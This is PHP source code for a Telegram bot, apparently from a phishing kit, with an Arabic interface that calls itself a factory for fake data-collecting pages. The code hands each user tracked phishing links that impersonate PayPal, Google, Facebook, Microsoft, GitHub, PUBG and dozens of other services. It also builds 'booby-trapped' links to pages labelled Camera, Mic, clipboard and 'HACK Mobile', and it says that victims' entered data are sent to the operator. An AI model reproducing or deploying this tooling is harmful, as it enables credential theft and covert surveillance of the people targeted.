<?php

#=========================

#========/start=======#
if($text == "/start"){
unlink("database/$token/$chat_id/database.txt");
bot('sendMessage', [
    'chat_id' => $chat_id,
    'text' => "🤖✨ **بوت مصنع الاندكسات** هو أداة متطورة تتيح لك إنشاء صفحات مزورة لجمع البيانات بطريقة سهلة وسريعة. يمكنك اختيار الأنماط الجاهزة المتاحة، وسيقوم البوت بتوفير رابط فريد لمشاركته.

📄🔍 **تجربة سلسة** حيث يمكنك الاطلاع على الخيارات المتاحة واختيار ما يناسب احتياجاتك. كما يتمتع البوت بمستوى عالٍ من الأمان والخصوصية.

💡🔒 **استمتع بواجهة مستخدم بسيطة ودعم فني متاح** لمساعدتك في أي وقت. استخدم بوت مصنع الاندكسات لتحقيق أهدافك بكفاءة وأمان.",
    'parse_mode' => "Markdown",
    'disable_web_page_preview' => true,
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [
                ['text' => 'انشاء صفحه مزوره 🚀', 'callback_data' => 'index'],
                ['text' => 'انشاء رابط ملغم ☠️', 'callback_data' => 'exit1']
            ],
            [
                ['text' => 'اختصار روابط', 'web_app' => ['url' => 'https://m-r.pw/']]
            ],
            [
                ['text' => '- شرح البوت', 'callback_data' => 'help']
            ],
            [
                ['text' => 'تعليمات البوت ⚠️', 'callback_data' => 'no'],
                ['text' => 'شراء نسخة البوت', 'url' => 'https://t.me/@jo2k2er']
            ],
            [
                ['text' => 'شارك البوت', 'url' => 'https://t.me/share/url?url=🤖✨ **بوت مصنع الاندكسات** هو أداة متطورة تتيح لك إنشاء صفحات مزورة لجمع البيانات بطريقة سهلة وسريعة. يمكنك اختيار الأنماط الجاهزة المتاحة، وسيقوم البوت بتوفير رابط فريد لمشاركته.

📄🔍 **تجربة سلسة** حيث يمكنك الاطلاع على الخيارات المتاحة واختيار ما يناسب احتياجاتك. كما يتمتع البوت بمستوى عالٍ من الأمان والخصوصية.

💡🔒 **استمتع بواجهة مستخدم بسيطة ودعم فني متاح** لمساعدتك في أي وقت. استخدم بوت مصنع الاندكسات لتحقيق أهدافك بكفاءة وأمان.
https://t.me/PTL24bot']
            ]
        ]
    ])
]);

}
#========index=======#
if ($data == "index") {
    bot('editMessageText', [
        'chat_id' => $chat_id2,
        'message_id' => $message_id,
        'text' => '🌟 **اختر صفحة الاندكس التي تناسب احتياجاتك!** 

ستجد مجموعة متنوعة من الصفحات الجاهزة التي تمكنك من جمع البيانات بسهولة. كل صفحة مصممة بعناية لتلبية متطلباتك الخاصة.

📄🔗 انقر نقرة مطولة على الزر لنسخ الرابط الاندكس',
        'reply_markup' => json_encode([
            'inline_keyboard' => [
    [['text' => '🎮 PUBG', 'url' => "$brokweb/GLACIER(PUBG)/?ID=$chat_id2"], ['text' => '🎮 PUBG2', 'url' => "$brokweb/SPIN/?ID=$chat_id2"], ['text' => '🎮 PUBG3', 'url' => "$brokweb/MIDASBUY(OLDxPUBG)/?ID=$chat_id2"]],
    [['text' => '🅰 Adobe', 'url' => "$brokweb/adobe/?ID=$chat_id2"], ['text' => '📘 Facebook', 'url' => "$brokweb/facebook/?ID=$chat_id2"], ['text' => '💬 Discord', 'url' => "$brokweb/discord/?ID=$chat_id2"]],
    [['text' => '💸 PayPal', 'url' => "$brokweb/paypal/?ID=$chat_id2"], ['text' => '🎬 Netflix', 'url' => "$brokweb/netflix/?ID=$chat_id2"], ['text' => '📷 Instagram', 'url' => "$brokweb/instagram/?ID=$chat_id2"]],
    [['text' => '🔍 Google', 'url' => "$brokweb/google/?ID=$chat_id2"], ['text' => '🔍 Google 2', 'url' => "$brokweb/google_new/?ID=$chat_id2"], ['text' => '❤️ Badoo', 'url' => "$brokweb/badoo/?ID=$chat_id2"]],
    [['text' => '💬 Messenger', 'url' => "$brokweb/fb_messenger/?ID=$chat_id2"], ['text' => '🐱 GitHub', 'url' => "$brokweb/github/?ID=$chat_id2"], ['text' => '🦊 GitLab', 'url' => "$brokweb/gitlab/?ID=$chat_id2"]],
    [['text' => '🛒 eBay', 'url' => "$brokweb/ebay/?ID=$chat_id2"], ['text' => '🎨 DeviantArt', 'url' => "$brokweb/deviantart/?ID=$chat_id2"], ['text' => '👥 IG Followers', 'url' => "$brokweb/ig_followers/?ID=$chat_id2"]],
    [['text' => '📁 MediaFire', 'url' => "$brokweb/mediafire/?ID=$chat_id2"], ['text' => '🛰 Yandex', 'url' => "$brokweb/yandex/?ID=$chat_id2"], ['text' => '🎵 TikTok', 'url' => "$brokweb/tiktok/?ID=$chat_id2"]],
    [['text' => '🐦 Twitter', 'url' => "$brokweb/twitter/?ID=$chat_id2"], ['text' => '📺 Twitch', 'url' => "$brokweb/twitch/?ID=$chat_id2"], ['text' => '🌐 WordPress', 'url' => "$brokweb/wordpress/?ID=$chat_id2"]],
    [['text' => '🎮 Roblox', 'url' => "$brokweb/roblox/?ID=$chat_id2"], ['text' => '👻 Snapchat', 'url' => "$brokweb/snapchat/?ID=$chat_id2"], ['text' => '💻 Microsoft', 'url' => "$brokweb/microsoft/?ID=$chat_id2"]],
    [['text' => '🎵 Spotify', 'url' => "$brokweb/spotify/?ID=$chat_id2"], ['text' => '🔥 FreeFire', 'url' => "$brokweb/FREEFIRE/?ID=$chat_id2"], ['text' => '🔥 FreeFire2', 'url' => "$brokweb/FREEFIRE2/?ID=$chat_id2"]],
    [['text' => '✥ عودة ↩ ٭', 'callback_data' => 'exit']]
]

        ])
    ]);
}

#=========help========#
if($data == "help"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'⚠️ **تعليمات استخدام بوت صانع اندكسات** ⚠️

مرحبًا بك في بوت صانع اندكسات! لإتمام تجربتك بأفضل شكل ممكن، نوصيك باتباع التعليمات التالية:

1. **البدء** 🚀:
   - لبدء استخدام البوت، أرسل الأمر `/start` أو انقر على زر "قسم الخدمات" في القائمة الرئيسية.
  
2. **إنشاء اندكس جديد** 🛠️:
   - اختر خيار "إنشاء اندكس" من القائمة.
   - اختر نوع الصفحه المراد إرساله مع المستهدفين
- سيتم إنشاء رابط خاص بالاندكس، يمكنك مشاركته مع المستهدفين.

3. **تلقي التنبيهات** 🔔:
   - ستتلقى إشعارات فورية على البوت عند قيام أي شخص بالتسجيل في اندكساتك.
   - تتضمن الإشعارات جميع البيانات المدخلة من قبل المستخدمين، مما يمكنك من متابعة وتحليل النتائج بسهولة.

4. **الأمان والخصوصية** 🔒:
   - تأكد من استخدام الروابط الخاصة بك بحذر وعدم مشاركتها إلا مع الأشخاص المستهدفين.
   - نوصي بعدم استخدام الاندكسات لأغراض غير قانونية أو لإيذاء الآخرين.

5. **المساعدة والدعم** 🆘:
   - في حال واجهت أي مشكلة أو كنت بحاجة إلى مساعدة، يمكنك الوصول إلى خيار "الدعم الفني" في القائمة للحصول على المساعدة الفورية.
   
6. **مشاركة البوت** 🤝:
   - شارك البوت مع أصدقائك ومعارفك عبر خيار "شارك البوت" لتمكينهم من الاستفادة من خدماته.

باستخدامك لبوت صانع اندكسات، يمكنك بسهولة إنشاء وإدارة صفحات التسجيل المزورة بكفاءة وأمان. اتبع التعليمات بعناية لضمان تحقيق أفضل النتائج. إذا كان لديك أي استفسار، لا تتردد في طلب المساعدة. شكراً لاستخدامك بوت صانع اندكسات!',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'حسناا','callback_data'=>'exit']]    
]    
])
]);
}
#=========no=========#
if($data == "no"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'
📜 **قوانين استخدام بوت صانع اندكسات** 📜

لضمان تجربة آمنة وسلسة لجميع مستخدمينا، يُرجى الالتزام بالقوانين التالية عند استخدام بوت صانع اندكسات:

1. **الاستخدام القانوني** ⚖️:
   - يجب استخدام البوت لأغراض قانونية فقط. يُمنع استخدام البوت لأي أنشطة غير قانونية أو ضارة.
   - يحظر استخدام البوت لجمع بيانات المستخدمين بدون موافقتهم الصريحة.

2. **الخصوصية والأمان** 🔒:
   - يجب على المستخدمين الحفاظ على سرية روابط الاندكس وعدم مشاركتها إلا مع الأشخاص المستهدفين بشكل آمن.
   - يمنع نشر أو مشاركة أي معلومات شخصية تم جمعها من خلال الاندكسات مع أطراف ثالثة بدون موافقة صريحة من أصحاب البيانات.

3. **الاحترام والأخلاق** 🌟:
   - يُمنع استخدام البوت لنشر أو توزيع محتوى مسيء، غير أخلاقي، أو يحض على الكراهية بأي شكل من الأشكال.
   - يجب التعامل مع جميع المستخدمين والزملاء باحترام واحترافية.

4. **الالتزام بالشروط** 📋:
   - يجب الالتزام بجميع الشروط والأحكام الخاصة بالبوت كما هي مذكورة في الوثائق الرسمية.
   - يُمنع استخدام البوت بطرق تتعارض مع شروط الخدمة الخاصة بتليجرام.

5. **حماية الحساب** 🔐:
   - يُنصح المستخدمون بتأمين حساباتهم الشخصية وعدم مشاركة تفاصيل الدخول مع أي شخص آخر.
   - يجب الإبلاغ فورًا عن أي نشاط مشبوه أو محاولات غير مصرح بها للوصول إلى الحساب.

6. **الإبلاغ عن الأخطاء** 🛠️:
   - في حالة اكتشاف أي أخطاء أو ثغرات في البوت، يُرجى الإبلاغ عنها لفريق الدعم الفني فورًا لتفادي استغلالها.
   - يُمنع محاولة استغلال أو إساءة استخدام أي أخطاء أو ثغرات في النظام.

7. **الاستخدام العادل** ⚙️:
   - يجب استخدام البوت بشكل يتوافق مع سياسة الاستخدام العادل، وتجنب أي محاولات لإساءة استخدام الموارد المتاحة.
   - يُمنع استخدام البرامج الآلية أو أي وسائل غير مصرح بها للوصول إلى البوت أو التفاعل معه.

---

نحن نقدر التزامكم بهذه القوانين لضمان بيئة آمنة وموثوقة للجميع. انتهاك أي من هذه القوانين قد يؤدي إلى إيقاف أو حظر حسابك. شكراً لتفهمكم وتعاونكم.

إذا كان لديكم أي استفسارات أو تحتاجون إلى مزيد من المعلومات، يُرجى التواصل مع فريق الدعم الفني.
',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'حسناا','callback_data'=>'exit']]    
]    
])
]);
}
#=========exit========#
if($data == "exit"){

bot('editMessageText', [
    'chat_id' => $chat_id2,
    'message_id' => $message_id,
    'text' => "🤖✨ **بوت مصنع الاندكسات** هو أداة متطورة تتيح لك إنشاء صفحات مزورة لجمع البيانات بطريقة سهلة وسريعة. يمكنك اختيار الأنماط الجاهزة المتاحة، وسيقوم البوت بتوفير رابط فريد لمشاركته.

📄🔍 **تجربة سلسة** حيث يمكنك الاطلاع على الخيارات المتاحة واختيار ما يناسب احتياجاتك. كما يتمتع البوت بمستوى عالٍ من الأمان والخصوصية.

💡🔒 **استمتع بواجهة مستخدم بسيطة ودعم فني متاح** لمساعدتك في أي وقت. استخدم بوت مصنع الاندكسات لتحقيق أهدافك بكفاءة وأمان.",
    'parse_mode' => "Markdown",
    'disable_web_page_preview' => true,
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [
                ['text' => 'انشاء صفحه مزوره 🚀', 'callback_data' => 'index'],
                ['text' => 'انشاء رابط ملغم ☠️', 'callback_data' => 'exit1']
            ],
            [
                ['text' => 'اختصار روابط', 'web_app' => ['url' => 'https://m-r.pw/']]
            ],
            [
                ['text' => '- شرح البوت', 'callback_data' => 'help']
            ],
            [
                ['text' => 'تعليمات البوت ⚠️', 'callback_data' => 'no'],
                ['text' => 'شراء نسخة البوت', 'url' => 'https://t.me/Secretiop2']
            ],
            [
                ['text' => 'شارك البوت', 'url' => 'https://t.me/share/url?url=🤖✨ **بوت مصنع الاندكسات** هو أداة متطورة تتيح لك إنشاء صفحات مزورة لجمع البيانات بطريقة سهلة وسريعة. يمكنك اختيار الأنماط الجاهزة المتاحة، وسيقوم البوت بتوفير رابط فريد لمشاركته.

📄🔍 **تجربة سلسة** حيث يمكنك الاطلاع على الخيارات المتاحة واختيار ما يناسب احتياجاتك. كما يتمتع البوت بمستوى عالٍ من الأمان والخصوصية.

💡🔒 **استمتع بواجهة مستخدم بسيطة ودعم فني متاح** لمساعدتك في أي وقت. استخدم بوت مصنع الاندكسات لتحقيق أهدافك بكفاءة وأمان.
https://t.me/PTL24bot']
            ]
        ]
    ])
]);

}
//========== وضع صيانة ============
if ($data == "exit1") {
   file_put_contents("database/$token/$chat_id2/database.txt", "url");
    bot('editMessageText', [
        'chat_id' => $chat_id2,
        'message_id' => $message_id,
        'text' => "☠️ قم بارسال الرابط المراد تلغيمه

سيتم إنشاء روابط ملغمه كل رابط مصمم لسحب بينات بسهوله

📄🔗 هناك روابط لا يمكن تلغيم هاء وقت تم خظر بعض الموقع ",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'رجوع', 'callback_data' => 'exit']]
            ]
        ])
    ]);
}
//===================================
$database = file_get_contents("database/$token/$chat_id/database.txt");
// التحقق من الرابط وإجراء العمليات المطلوبة
if ($text and $database == "url") {

    // التحقق من صحة الرابط
    if (filter_var($text, FILTER_VALIDATE_URL) === false) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "⚠️ الرابط غير صحيح. يرجى إدخال رابط صحيح."
        ]);
        return;
    }

    $linkFile = 'link.txt';
    $urlFile = 'url.txt';
    $linkExists = false;
    $link = '';

    // التحقق مما إذا كان الرابط موجودًا في link.txt
if (file_exists($linkFile)) {
    $links = file($linkFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $parsedTextUrl = parse_url($text);
    $textDomain = isset($parsedTextUrl['host']) ? $parsedTextUrl['host'] : '';

    foreach ($links as $line) {
        $parsedLineUrl = parse_url(trim($line));
        $lineDomain = isset($parsedLineUrl['host']) ? $parsedLineUrl['host'] : '';

        if ($textDomain === $lineDomain) {
            $linkExists = true;
            break;
        }
    }
}

if ($linkExists) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🚫 الرابط محظور."
    ]);
    return false;
}else {
        // التحقق من وجود الرابط في url.txt
        if (file_exists($urlFile)) {
            $urls = file($urlFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (in_array($text, $urls)) {
                $lineNumber = array_search($text, $urls) + 1; // إيجاد رقم السطر الذي يحتوي على الرابط
                $link = $lineNumber; // تعيين رقم السطر إلى المتغير $link
            } else {
                // إضافة الرابط إلى الملف
                file_put_contents($urlFile, $text . PHP_EOL, FILE_APPEND);
                // تحديث رقم السطر بعد إضافة الرابط
                $lineNumber = count($urls) + 1;
                $link = $lineNumber; // تعيين رقم السطر إلى المتغير $link
            }
        } else {
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "خطأ غير متوقع ⛔"
            ]);
            return false;
        }
    }

    // إرسال رسالة للمستخدم بعد التحقق من الرابط
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌟 اختر صفحة الملغمه التي  تناسب احتياجاتك!

ستجد مجموعة متنوعة من الصفحات الجاهزة التي تمكنك من جمع البيانات بسهولة. كل صفحة مصممة بعناية لتلبية متطلباتك الخاصة.

📄🔗 انقر نقرة مطولة على الزر لنسخ الرابط الاندكس",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => '📷 Camera', 'url' => "$brokweb/com/?ID=$chat_id&link=$link"],
                 ['text' => '📱 HACK Mobile', 'url' => "$brokweb/mode/?ID=$chat_id&link=$link"]],
                [['text' => '🎧 HACK', 'url' => "$brokweb/mic/?ID=$chat_id&link=$link"],
                 ['text' => '📋 HACK', 'url' => "$brokweb/copy/?ID=$chat_id&link=$link"]],
                [['text' => '↩ عودة', 'callback_data' => 'exit']]
            ]
        ])
    ]);
}
?>
